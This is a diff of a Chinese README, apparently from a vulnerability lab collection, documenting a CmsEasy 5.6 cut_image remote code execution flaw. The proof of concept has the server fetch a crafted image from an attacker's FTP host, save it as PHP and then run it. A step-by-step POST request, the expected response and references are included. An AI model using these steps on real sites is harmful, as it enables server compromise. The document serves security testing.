@@ -1,42 +1,45 @@
 ## CmsEasy 5.6  cut_image 代码执行漏洞
 
-- payload生成
+测试镜像
 
-  使用生成脚本jpg_payload.php生成payload，或直接使用已生成的poc_phpinfo_700x1120.png
+* src/cmseasy/5.6
 
-  ​
+影响版本
 
-- 漏洞测试
+* CmsEasy <= 5.6
 
-  将生成的payload上传至攻击者的ftp服务器，并发起 POST 请求，地址为：
+参考链接
 
-  ```
-  http://127.0.0.1/index.php?case=tool&act=cut_image
-  ```
+* [CmsEasy < 5.6 20161012 cut_image 代码执行漏洞](https://github.com/Medicean/VulApps/tree/master/c/cmseasy/1)
+* [CmsEasy前台无限制GetShell](https://xz.aliyun.com/t/416)
+* [CmsEasy前台无限制GetShell【Getshell的补充说明】](https://xz.aliyun.com/t/365)
 
-  POST data:
+Poc
 
-  ```
-  pic=1ftp://攻击者FTP地址/phpinfo.php&w=700&h=1120&x1=0&x2=700&y1=0&y2=1120
-  ```
+使用`cut_image代码执行漏洞`目录下的生成脚本`jpg_payload.php`生成payload，或直接使用已生成的`poc_phpinfo_700x1120.png`文件。
 
-  成功会返回如下形式的数据：
+测试方法：
 
-  ```
-  {"code":"\r\n \/\/$('#cut_preview').attr('src','\/upload\/images\/201612\/148159258747.php');\r\n $('#thumb').val('\/upload\/images\/201612\/148159258747.php');\r\n\t\t\t\t alert(lang('save_success'));\r\n "}
-  ```
+将生成的payload上传至攻击者的ftp服务器，并发起 POST 请求，地址为：
 
-  根据返回的文件名，访问上传成功后的php文件
+```
+http://127.0.0.1/index.php?case=tool&act=cut_image
+```
 
-  `http://127.0.0.1/upload/images/201612/148159258747.php`
+POST data:
 
-  ​
+```
+pic=1ftp://攻击者FTP地址/phpinfo.php&w=700&h=1120&x1=0&x2=700&y1=0&y2=1120
+```
 
-- 详细POC参考：
+成功会返回如下形式的数据：
 
-  https://github.com/Medicean/VulApps/tree/master/c/cmseasy/1
+```
+{"code":"\r\n \/\/$('#cut_preview').attr('src','\/upload\/images\/201612\/148159258747.php');\r\n $('#thumb').val('\/upload\/images\/201612\/148159258747.php');\r\n\t\t\t\t alert(lang('save_success'));\r\n "}
+```
 
-  https://xz.aliyun.com/t/416
+根据返回的文件名，访问上传成功后的php文件
 
-  https://xz.aliyun.com/t/365
+`http://127.0.0.1/upload/images/201612/148159258747.php`
+
 
